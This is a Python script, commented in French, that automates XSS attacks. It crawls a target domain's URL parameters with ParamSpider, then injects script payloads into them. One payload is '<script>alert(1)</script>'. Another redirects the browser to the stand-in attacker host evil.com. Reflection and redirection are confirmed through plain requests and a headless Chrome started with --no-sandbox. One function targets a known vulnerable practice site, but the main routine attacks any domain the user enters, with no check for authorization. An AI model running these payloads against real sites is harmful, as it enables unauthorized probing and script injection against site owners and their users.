import requests
from itertools import product
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote, urlparse
import time
import urllib.parse
import webbrowser
import os
import subprocess
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import tempfile



def lancer_paramspider(url):
    try:
        print(f"[+] Lancement de : paramspider -d {url}")
        subprocess.run(["paramspider", "-d", url], check=True)
    except subprocess.CalledProcessError as e:
        print("[-] Erreur pendant l'exécution de ParamSpider.")
        print(e)
def scan_XSS(target_url):
    # Payloads XSS à tester
    xss_payloads = [
        "<script>alert(1)</script>"
    ]

    # Charger les URLs depuis un fichier
    input_file = f"results/{target_url}.txt"
    output_file = f"results/{target_url}_result.txt"

    if not os.path.exists(input_file):
        print(f"[!] Le fichier {input_file} n'existe pas.")
        return

    with open(input_file, "r") as f:
        raw_urls = [line.strip() for line in f if "FUZZ" in line]

    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner)"
    }

    # Stocker les URLs déjà testées pour éviter les doublons
    tested_urls = set()

    print(f"🔍 Test de {len(raw_urls)} URLs avec permutations...\n")

    found_vulns = []

    for base_url in raw_urls:
        fuzz_count = base_url.count("FUZZ")
        if fuzz_count == 0:
            continue

        for payload in xss_payloads:
            # Générer toutes les combinaisons possibles de remplacement de FUZZ
            combos = list(product([payload, "FUZZ"], repeat=fuzz_count))

            for combo in combos:
                test_url = base_url
                for replacement in combo:
                    test_url = test_url.replace("FUZZ", replacement, 1)

                # Clé unique pour chaque URL testée
                unique_key = (test_url, payload)
                if unique_key in tested_urls:
                    continue  # Ignorer les doublons

                tested_urls.add(unique_key)

                try:
                    response = requests.get(test_url, headers=headers, timeout=5)
                    if payload in response.text:
                        print("⚠️  Vulnérabilité XSS potentielle trouvée !")
                        print(f"    ➜ Payload : {payload}")
                        print(f"    ➜ URL     : {test_url}\n")

                        found_vulns.append(f"Payload: {payload}\nURL: {test_url}\n\n")
                except requests.RequestException as e:
                    print(f"[!] Erreur de requête : {e}")

    # Écrire les résultats dans un fichier
    if found_vulns:
        with open(output_file, "w") as f_out:
            f_out.writelines(found_vulns)
        print(f"✅ Résultats enregistrés dans : {output_file}")
    else:
        print("✅ Aucun résultat à enregistrer (aucune vulnérabilité trouvée).")
                    
def test_xss_redirection():
    """
    Teste si une redirection vers evil.com est détectable via une requête HTTP simple.
    Si oui, ouvre Firefox avec l'URL contenant le payload.
    
    Returns:
        tuple: (redirection_detectée: bool, url_finale: str)
    """
    payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = urllib.parse.quote(payload)
    target_url = f"http://testphp.vulnweb.com/listproducts.php?artist={encoded_payload}"

    try:
        response = requests.get(target_url, allow_redirects=True, timeout=5)
        final_url = response.url
        redirige = "evil.com" in final_url

        if redirige:
            print("[✅] Redirection détectée vers :", final_url)

            # 🧨 Lance Firefox (non-root recommandé)
            process = subprocess.Popen(["xdg-open", target_url])

            # ⏳ Attend 5 secondes
            time.sleep(5)

            # 🛑 Termine le processus proprement
            process.terminate()  # envoie SIGTERM
            time.sleep(1)
            if process.poll() is None:
                process.kill()  # force si pas terminé
        else:
            print("[❌] Pas de redirection. URL finale :", final_url)

        return redirige, final_url

    except Exception as e:
        print("[⚠️] Erreur réseau :", e)
        return False, ""
        

def test_XSS(target_url):


    xss_payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = quote(xss_payload)

    try:
        with open(f"results/{target_url}.txt", "r") as f:
            raw_urls = [line.strip() for line in f if "FUZZ" in line]
    except FileNotFoundError:
        print(f"[❌] Fichier results/{target_url}.txt introuvable.")
        return

    tested_urls = set()
    print(f"🔍 Test de {len(raw_urls)} URLs avec navigateur (Selenium)...\n")

    # Configuration compatible avec exécution root
    temp_profile = f"/tmp/chrome-profile-{os.getpid()}"
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument(f"--user-data-dir={temp_profile}")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    for base_url in raw_urls:
        if "FUZZ" not in base_url:
            continue

        test_url = base_url.replace("FUZZ", encoded_payload)
        if test_url in tested_urls:
            continue
        tested_urls.add(test_url)

        print(f"🌐 Test navigateur de : {test_url}")
        try:
            driver.get(test_url)
            time.sleep(3)  # Attendre la redirection JS

            final_url = driver.current_url
            parsed_url = urlparse(final_url)
            print("🌐 Domaine détecté :", parsed_url.netloc)
            redirige = parsed_url.netloc in ["evil.com", "www.evil.com"]

            if redirige:
                print("[✅] Redirection JS détectée vers :", final_url)
                print("🛑 Scan arrêté suite à une redirection confirmée.")
                driver.quit()
                return
            else:
                print("[❌] Pas de redirection JS. URL finale :", final_url)

        except Exception as e:
            print("[⚠️] Erreur navigateur :", e)

    driver.quit()


                    
if __name__ == "__main__":
    url = input("Entrez l'URL (domaine) cible (ex: example.com) : ").strip()
    lancer_paramspider(url)
    scan_XSS(url)
    test_XSS(url) 
